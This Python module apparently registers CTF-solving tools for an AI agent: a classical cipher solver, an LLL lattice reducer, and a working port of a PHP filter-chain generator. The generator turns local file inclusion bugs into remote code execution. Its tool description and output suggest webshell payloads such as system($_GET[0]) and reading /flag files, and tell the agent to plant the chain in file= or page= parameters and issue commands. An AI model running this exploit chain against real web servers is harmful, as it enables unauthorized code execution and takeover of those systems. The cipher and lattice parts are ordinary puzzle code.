"""Crypto 扩展工具：classical_cipher / lattice_lll / php_filter_chain

设计约定：
- classical_cipher 纯 Python 实现（卡方频率分析），auto 模式全算法竞赛式打分
- lattice_lll 三级降级：fpylll → sage → 纯 Python LLL
- php_filter_chain 为 synacktiv php_filter_chain_generator 的忠实移植（转换表原样保留），
  php 可用时自动实测验证
"""
import base64
import hashlib
import json
import os
import random
import re
import shutil
import subprocess

from tools.base import register_tool, run_cmd

FLAG_RE = re.compile(r"(?:flag|FLAG|ctf|CTF)\{[^}]{4,200}\}")


def _which(binname):
    if binname not in _WHICH_CACHE:
        _WHICH_CACHE[binname] = shutil.which(binname)
    return _WHICH_CACHE[binname]


_WHICH_CACHE = {}


def _grep_flags(text):
    return list(dict.fromkeys(FLAG_RE.findall(text or "")))


def _truncate(s, n=500):
    s = (s or "").strip()
    return s if len(s) <= n else s[:n] + f"...[截断, 原文 {len(s)} 字符]"


# ════════════════════════════════════════════════════════════════════════════
# 1. classical_cipher：古典密码自动求解
# ════════════════════════════════════════════════════════════════════════════

_EN_FREQ = {  # 英文字母频率（百分比）
    'a': 8.2, 'b': 1.5, 'c': 2.8, 'd': 4.3, 'e': 12.7, 'f': 2.2, 'g': 2.0,
    'h': 6.1, 'i': 7.0, 'j': 0.15, 'k': 0.77, 'l': 4.0, 'm': 2.4, 'n': 6.7,
    'o': 7.5, 'p': 1.9, 'q': 0.095, 'r': 6.0, 's': 6.3, 't': 9.1, 'u': 2.8,
    'v': 0.98, 'w': 2.4, 'x': 0.15, 'y': 2.0, 'z': 0.074,
}


def _chi2(text: str) -> float:
    """英文单字母频率卡方分数（越小越像英文）"""
    letters = [c.lower() for c in text if c.isalpha()]
    n = len(letters)
    if n < 8:
        return float("inf")
    obs = {c: 0 for c in "abcdefghijklmnopqrstuvwxyz"}
    for c in letters:
        obs[c] += 1
    score = 0.0
    for c, freq in _EN_FREQ.items():
        exp = n * freq / 100.0
        score += (obs[c] - exp) ** 2 / max(exp, 0.1)
    return score


def _caesar_all(text: str):
    """返回 [(score, shift, plaintext), ...] 按分数升序"""
    out = []
    for shift in range(26):
        dec = "".join(
            chr((ord(c.lower()) - 97 - shift) % 26 + 97) if c.isalpha() else c
            for c in text
        )
        out.append((_chi2(dec), shift, dec))
    out.sort(key=lambda x: x[0])
    return out


def _atbash(text: str) -> str:
    return "".join(
        chr(219 - ord(c.lower())) if c.isalpha() else c for c in text
    )


def _railfence_decrypt(ct: str, rails: int) -> str:
    if rails < 2:
        return ct
    pattern = []
    r, d = 0, 1
    for _ in range(len(ct)):
        pattern.append(r)
        r += d
        if r in (0, rails - 1):
            d = -d
    order = sorted(range(len(ct)), key=lambda i: (pattern[i], i))
    plain = [""] * len(ct)
    for i, idx in enumerate(order):
        plain[idx] = ct[i]
    return "".join(plain)


def _ic(text: str) -> float:
    letters = [c.lower() for c in text if c.isalpha()]
    n = len(letters)
    if n < 2:
        return 0.0
    counts = {}
    for c in letters:
        counts[c] = counts.get(c, 0) + 1
    return sum(v * (v - 1) for v in counts.values()) / (n * (n - 1))


def _vigenere_solve(ct: str):
    """IC 找 keylen → 逐列卡方找位移。返回 (key, plaintext, keylen) 或 None"""
    letters = [c.lower() for c in ct if c.isalpha()]
    if len(letters) < 30:
        return None
    best = None
    for klen in range(1, 21):
        if len(letters) // klen < 5:
            break
        cols = [letters[i::klen] for i in range(klen)]
        avg_ic = sum(_ic("".join(c)) for c in cols) / klen
        if best is None or abs(avg_ic - 0.066) < abs(best[0] - 0.066):
            best = (avg_ic, klen)
    if best is None or best[0] < 0.055:  # 不像多表替换
        return None
    klen = best[1]
    key = ""
    for col in [letters[i::klen] for i in range(klen)]:
        col_text = "".join(col)
        shift = min(range(26), key=lambda s: _chi2(
            "".join(chr((ord(c) - 97 - s) % 26 + 97) for c in col_text)))
        key += chr(97 + shift)
    plain = []
    ki = 0
    for c in ct:
        if c.isalpha():
            k = ord(key[ki % klen]) - 97
            base = 97 if c.islower() else 65
            plain.append(chr((ord(c.lower()) - 97 - k) % 26 + base) if c.islower()
                         else chr((ord(c.lower()) - 97 - k) % 26 + base))
            ki += 1
        else:
            plain.append(c)
    return key, "".join(plain), klen


def _substitution_solve(text: str):
    """单表替换爬山法（单字母频率打分，文本 ≥ 60 字母时较可靠）"""
    letters = [c.lower() for c in text if c.isalpha()]
    if len(letters) < 60:
        return None
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    # 初始 key：按观察频率对齐英文频率
    counts = {c: letters.count(c) for c in alphabet}
    by_freq_en = sorted(alphabet, key=lambda c: -_EN_FREQ[c])
    by_freq_obs = sorted(alphabet, key=lambda c: -counts[c])
    key_map = dict(zip(by_freq_obs, by_freq_en))  # 密文字母 → 明文字母
    rev = {v: k for k, v in key_map.items()}

    def decrypt_with(km):
        return "".join(km.get(c, c) for c in letters)

    cur_key = dict(key_map)
    best_score = _chi2(decrypt_with(cur_key))
    rng = random.Random(int(hashlib.md5(text.encode()).hexdigest()[:8], 16))
    for _ in range(4000):
        a, b = rng.sample(alphabet, 2)
        cur_key[a], cur_key[b] = cur_key[b], cur_key[a]
        s = _chi2(decrypt_with(cur_key))
        if s < best_score:
            best_score = s
        else:
            cur_key[a], cur_key[b] = cur_key[b], cur_key[a]
    # 还原非字母字符
    result = []
    for c in text:
        if c.isalpha():
            p = cur_key.get(c.lower(), c)
            result.append(p.upper() if c.isupper() else p)
        else:
            result.append(c)
    plain = "".join(result)
    key_row = "".join(cur_key.get(c, "?") for c in alphabet)  # 密文表
    return plain, key_row


@register_tool(
    "classical_cipher",
    "古典密码自动求解：auto 模式对凯撒/维吉尼亚/单表替换/栅栏/Atbash/逆序全部打分，"
    "返回最像英文的候选及密钥。栅栏/维吉尼亚/凯撒是精确算法，单表替换靠爬山法"
    "（密文 ≥ 60 字母时可靠）。",
    {
        "type": "object",
        "properties": {
            "ciphertext": {"type": "string", "description": "密文"},
            "cipher": {"type": "string",
                       "enum": ["auto", "caesar", "vigenere", "substitution", "railfence", "atbash"]},
        },
        "required": ["ciphertext"],
    },
)
def classical_cipher(ciphertext: str, cipher: str = "auto") -> str:
    ciphertext = (ciphertext or "").strip()
    if not ciphertext:
        return "[参数错误] ciphertext 为空"
    if len(ciphertext) > 20000:
        ciphertext = ciphertext[:20000]

    results = []  # (score, 名称, 明文, 附加信息)

    if cipher in ("auto", "caesar"):
        for score, shift, dec in _caesar_all(ciphertext)[:3]:
            if score != float("inf"):
                results.append((score, f"凯撒 shift={shift}", dec, ""))

    if cipher in ("auto", "atbash"):
        dec = _atbash(ciphertext)
        results.append((_chi2(dec), "Atbash", dec, ""))

    if cipher in ("auto", "substitution"):
        r = _substitution_solve(ciphertext)
        if r:
            results.append((_chi2(r[0]), "单表替换(爬山法)", r[0], f"密文映射表: {r[1]}"))

    if cipher in ("auto", "vigenere"):
        r = _vigenere_solve(ciphertext)
        if r:
            key, plain, klen = r
            results.append((_chi2(plain), f"维吉尼亚 keylen={klen}", plain, f"key={key}"))

    if cipher in ("auto", "railfence"):
        best = None
        for rails in range(2, min(16, max(3, len(ciphertext) // 2))):
            dec = _railfence_decrypt(ciphertext, rails)
            s = _chi2(dec)
            if best is None or s < best[0]:
                best = (s, dec, rails)
        if best and best[0] != float("inf"):
            results.append((best[0], f"栅栏 rails={best[2]}", best[1], ""))

    if not results:
        return "[FAIL] 无候选（文本太短或不像英文古典密码）。\n[下一步] 密文若含数字/符号先 auto_decode；"
    results.sort(key=lambda x: x[0])
    lines = []
    for i, (score, name, plain, extra) in enumerate(results[:3]):
        flag_note = ""
        flags = _grep_flags(plain)
        if flags:
            flag_note = f"  ⚠️ 含疑似 flag: {flags}"
        lines.append(f"[候选{i + 1}] {name} (卡方={score:.1f}){flag_note}\n"
                     f"{plain[:1500]}{'...' if len(plain) > 1500 else ''}"
                     + (f"\n[附加] {extra}" if extra else ""))
    best = results[0]
    verdict = (f"\n[结论] 最优: {best[1]}。人工确认语义通顺后采用。"
               if best[0] < 120 else
               "\n[结论] 所有候选分数偏高（不像英文），可能不是古典密码 → 试 auto_decode/base64 或字典序变换。")
    return "\n\n".join(lines) + verdict


# ════════════════════════════════════════════════════════════════════════════
# 2. lattice_lll：格基规约（LLL）
# ════════════════════════════════════════════════════════════════════════════

def _lll_pure(B):
    """纯 Python LLL（δ=0.75，整数矩阵，维度 ≤ 40 适用）"""
    from fractions import Fraction
    n = len(B)
    B = [row[:] for row in B]
    if n == 0:
        return B

    def gso(basis):
        """Gram-Schmidt: 返回正交基 star 和系数 mu"""
        star = [row[:] for row in basis]
        mu = [[Fraction(0)] * n for _ in range(n)]
        for i in range(n):
            for j in range(i):
                num = sum(Fraction(basis[i][k]) * star[j][k] for k in range(len(basis[i])))
                den = sum(Fraction(star[j][k]) * star[j][k] for k in range(len(star[j])))
                mu[i][j] = num / den if den else Fraction(0)
                for k in range(len(star[i])):
                    star[i][k] -= mu[i][j] * star[j][k]
        return star, mu

    k = 1

    def norm2(row):
        return sum(Fraction(x) * x for x in row)

    while k < n:
        star, mu = gso(B)
        for j in range(k - 1, -1, -1):
            if abs(mu[k][j]) > Fraction(1, 2):
                r = round(mu[k][j])
                for x in range(len(B[k])):
                    B[k][x] -= r * B[j][x]
                star, mu = gso(B)
        lhs = Fraction(3, 4) * norm2(star[k - 1])
        rhs = norm2(star[k]) + mu[k][k - 1] ** 2 * norm2(star[k - 1])
        if lhs <= rhs:
            k += 1
        else:
            B[k], B[k - 1] = B[k - 1], B[k]
            k = max(k - 1, 1)
    return B


@register_tool(
    "lattice_lll",
    "LLL 格基规约。传 JSON 整数矩阵（行向量组），返回规约后的短向量组。"
    "格密码题（HNP/背包/NTRU）先自己构造格再调它。"
    "示例——隐藏数问题: 每行 [a_i, 1, K*B]，加一行 [t_i..., 0, -K*t0]，LLL 后看末列。"
    "背包: [1..n 单位向量 + A_i 列, -S]，找 0/1 解向量。",
    {
        "type": "object",
        "properties": {
            "basis": {"type": "string",
                      "description": "JSON 二维整数数组，如 [[1,0,0],[3,5,1],[0,7,2]]"},
        },
        "required": ["basis"],
    },
)
def lattice_lll(basis: str) -> str:
    try:
        B = json.loads(basis)
        if not isinstance(B, list) or not all(isinstance(r, list) for r in B):
            raise ValueError("必须二维数组")
        n, m = len(B), len(B[0])
        if not all(len(r) == m for r in B):
            raise ValueError("各行长度不一致")
        B = [[int(x) for x in row] for row in B]
    except Exception as e:
        return f"[参数错误] basis 解析失败: {e}"

    engine = None
    try:
        from fpylll import IntegerMatrix, LLL  # noqa
        A = IntegerMatrix.from_matrix(B)
        LLL.reduction(A)
        reduced = [[A[i][j] for j in range(m)] for i in range(n)]
        engine = "fpylll"
    except ImportError:
        if _which("sage"):
            script = (f"import json; M = Matrix({B}); "
                      f"print(json.dumps([list(map(int, row)) for row in M.LLL()]));")
            out = run_cmd(["sage", "-c", script], timeout=300)
            try:
                reduced = json.loads(out[out.index("["):out.rindex("]") + 1])
                engine = "sage"
            except Exception:
                reduced = None
        if engine is None or reduced is None:
            try:
                reduced = _lll_pure(B)
                engine = "纯Python(维度≤40建议用 fpylll: pip install fpylll)"
            except Exception as e:
                return f"[FAIL] 三条 LLL 路线均失败: {e}"

    lines = [f"[engine] {engine}", "[规约结果]"]
    for row in reduced:
        lines.append(json.dumps(row))
    # 找 0/1 型短向量（背包解的形态）
    zero_one = [r for r in reduced if r and all(abs(x) <= 1 for x in r) and any(x != 0 for x in r)]
    if zero_one:
        lines.append(f"[疑似 0/1 解] {zero_one[:3]}")
    lines.append("[结论] 取范数最小的行向量为候选解；0/1 题直接把 ±1 位置映射回明文位。"
                 "HNP 题从含小分量的行中提取 secret。")
    flags = _grep_flags(json.dumps(reduced))
    if flags:
        lines.append(f"[FLAG] 规约结果中出现疑似 flag: {flags}")
    return "\n".join(lines)


# ════════════════════════════════════════════════════════════════════════════
# 3. php_filter_chain：LFI→RCE 任意代码执行链生成
#    （synacktiv/php_filter_chain_generator 忠实移植，转换表原样保留）
# ════════════════════════════════════════════════════════════════════════════

_FILE_TO_USE = "php://temp"

_PFC_CONVERSIONS = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}


def _generate_filter_chain(chain_b64: str) -> str:
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"
    for c in chain_b64[::-1]:
        filters += _PFC_CONVERSIONS[c] + "|"
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"
    filters += "convert.base64-decode"
    return f"php://filter/{filters}/resource={_FILE_TO_USE}"


@register_tool(
    "php_filter_chain",
    "生成 php://filter 利用链，使 LFI 点无需上传/写权限即可执行任意 PHP 代码"
    "（include($_GET['file']) 类漏洞直接 RCE）。生成后把链填进 include 参数即可。"
    "常用 content: <?php system($_GET[0]);?> 或 <?=system('cat /flag*');?>",
    {
        "type": "object",
        "properties": {
            "content": {"type": "string",
                        "description": "要生成的 PHP 代码，如 <?php system($_GET[0]);?>"},
        },
        "required": ["content"],
    },
)
def php_filter_chain(content: str) -> str:
    content = (content or "").strip()
    if not content:
        return "[参数错误] content 为空"
    if not content.startswith("<?"):
        content = "<?php " + content

    b64 = base64.b64encode(content.encode()).decode().replace("=", "")
    for c in b64:
        if c not in _PFC_CONVERSIONS:
            return f"[参数错误] 生成失败: 字符 '{c}' 无对应转换（不应发生）"
    chain = _generate_filter_chain(b64)

    lines = [f"[目标代码] {content}", f"[base64] {b64}", f"[利用链]\n{chain}"]

    # php 可用时本地实测（注意：链对任意输入生效，此处用 php://temp 验证）
    # 说明：链输出 = 目标前缀 + 尾部对齐残余字节（原版行为），PHP 执行只看前缀，
    # 故用字节级 startswith 判断；输出含非 UTF-8 字节，必须以 bytes 处理。
    if _which("php"):
        try:
            pr = subprocess.run(["php", "-r", f'echo file_get_contents("{chain}");'],
                                capture_output=True, timeout=60)
            out = pr.stdout
            target_bytes = content.encode()
            if out.startswith(target_bytes):
                extra = len(out) - len(target_bytes)
                lines.append(f"[实测] ✅ 本地 php 实测前缀一致（尾部残余 {extra} 字节，不影响执行）")
            else:
                head = out[:60]
                lines.append(f"[实测] 输出前缀不符: {head!r}（目标 PHP 的 iconv 支持可能不同，"
                             f"给 payload 尾部补空格重试，或改用无空格变体）")
        except Exception as e:
            lines.append(f"[实测] 本地实测出错: {e}")
    else:
        lines.append("[INFO] 本机无 php 未实测，链按原版算法生成，可直接使用")
    lines.append("[下一步] 把利用链替换 LFI 参数值（file=、page=、include=），"
                 "webshell 用 ?0=<命令> 传参；配合 http_request 执行。")
    return "\n".join(lines)
